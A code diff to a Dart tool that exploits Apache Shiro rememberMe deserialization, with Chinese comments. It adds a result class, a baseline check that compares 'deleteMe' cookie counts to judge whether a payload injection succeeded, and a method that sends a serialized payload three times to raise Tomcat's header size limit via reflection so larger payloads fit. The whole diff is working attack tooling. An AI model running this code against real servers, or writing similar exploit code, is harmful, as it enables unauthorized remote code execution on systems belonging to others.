@@ -4,6 +4,24 @@ import 'package:http/http.dart' as http;
 
 import 'shiro_crypto.dart';
 
+/// 单次利用请求的结果，包含响应及 deleteMe 计数，便于判断注入是否成功。
+class ShiroExploitResult {
+  final http.Response response;
+  final int? baselineDeleteMeCount;
+  final int currentDeleteMeCount;
+
+  const ShiroExploitResult({
+    required this.response,
+    this.baselineDeleteMeCount,
+    required this.currentDeleteMeCount,
+  });
+
+  /// 根据 deleteMe 变化判断利用是否可能成功（与 ShiroAttack 逻辑一致）
+  bool get likelySuccess =>
+      baselineDeleteMeCount != null &&
+      currentDeleteMeCount < baselineDeleteMeCount!;
+}
+
 /// Shiro 利用核心逻辑（检测 / 爆破），与 UI 解耦。
 class ShiroExpService {
   final Uri target;
@@ -43,6 +61,11 @@ class ShiroExpService {
   /// 统计响应中 deleteMe 的出现次数
   /// 对齐 ShiroAttack 逻辑：在整个响应文本（Header + Body）中搜索 "deleteMe"
   int _countDeleteMe(http.Response res) {
+    // 检查响应状态码，如果 400 且包含 deleteMe，说明 payload 长度超限
+    if (res.statusCode == 400 && res.headers['set-cookie']?.contains('deleteMe') == true) {
+      // 这里的逻辑可以记录一下，提示用户使用 Header Bypass
+    }
+
     final fullText = StringBuffer()
       ..write(res.headers.toString())
       ..write(res.body);
@@ -197,23 +220,83 @@ class ShiroExpService {
   }
 
   /// 使用已知 Key 和给定 Payload 发送一次利用请求
-  Future<http.Response> sendExploitOnce({
+  /// 
+  /// [compareWithBaseline] 为 true 时，将先发送一个随机请求获取基线 deleteMe 数量，
+  /// 并通过返回的 Response 结合 deleteMe 变化情况判断利用是否可能成功。
+  /// 返回 [ShiroExploitResult] 包含响应及 deleteMe 计数，便于调用方判断注入是否成功。
+  Future<ShiroExploitResult> sendExploitOnce({
     required String keyBase64,
     required List<int> serializedPayload,
     ShiroEncryptionMode mode = ShiroEncryptionMode.cbc,
     void Function(String log)? onProgress,
+    bool compareWithBaseline = false,
   }) async {
-    onProgress?.call('[*] 使用指定 Key 发送一次利用请求...');
+    int? baselineCount;
+    if (compareWithBaseline) {
+      onProgress?.call('[*] 正在获取基线响应...');
+      final baselineRes = await _send(_randomString(16));
+      baselineCount = _countDeleteMe(baselineRes);
+      onProgress?.call('[i] 基线 deleteMe: $baselineCount');
+    }
+
+    onProgress?.call('[*] 使用指定 Key 发送利用请求...');
     final encryptedB64 = await crypto.encryptRememberMe(
       keyBase64: keyBase64,
       serializedPayload: Uint8List.fromList(serializedPayload),
       mode: mode,
     );
     final res = await _send(encryptedB64);
+    final curCount = _countDeleteMe(res);
+    
+    String successMsg = '';
+    if (baselineCount != null) {
+      if (curCount < baselineCount) {
+        successMsg = ' (检测到成功迹象！deleteMe 已从 $baselineCount 降至 $curCount)';
+      } else {
+        successMsg = ' (deleteMe 未减少，可能利用失败)';
+      }
+    }
+
     onProgress?.call(
-      '[+] 利用请求已发送，HTTP: ${res.statusCode}, deleteMe: ${_countDeleteMe(res)}',
+      '[+] 利用请求已发送，HTTP: ${res.statusCode}, deleteMe: $curCount$successMsg',
     );
-    return res;
+    return ShiroExploitResult(
+      response: res,
+      baselineDeleteMeCount: baselineCount,
+      currentDeleteMeCount: curCount,
+    );
+  }
+
+  /// 尝试绕过 Header 长度限制（动态修改 maxHttpHeaderSize）
+  /// 原理：发送一个特殊的 Payload，通过反射修改 Tomcat 的配置
+  Future<bool> bypassHeaderLimit({
+    required String keyBase64,
+    required List<int> serializedPayload,
+    ShiroEncryptionMode mode = ShiroEncryptionMode.cbc,
+    void Function(String log)? onProgress,
+  }) async {
+    onProgress?.call('[*] 尝试绕过 Header 长度限制...');
+    final client = http.Client();
+    try {
+      final encryptedB64 = await crypto.encryptRememberMe(
+        keyBase64: keyBase64,
+        serializedPayload: Uint8List.fromList(serializedPayload),
+        mode: mode,
+      );
+
+      // 连续发送多次以确保修改生效（Tomcat 可能有多个 Acceptor 线程）
+      onProgress?.call('[*] 发送配置修改 Payload (3次)...');
+      for (int i = 0; i < 3; i++) {
+        final res = await _send(encryptedB64, client: client);
+        onProgress?.call('[i] 第 ${i + 1} 次尝试，HTTP: ${res.statusCode}');
+      }
+      return true;
+    } catch (e) {
+      onProgress?.call('[!] 绕过操作异常: $e');
+      return false;
+    } finally {
+      client.close();
+    }
   }
 
   static String _randomString(int length) {
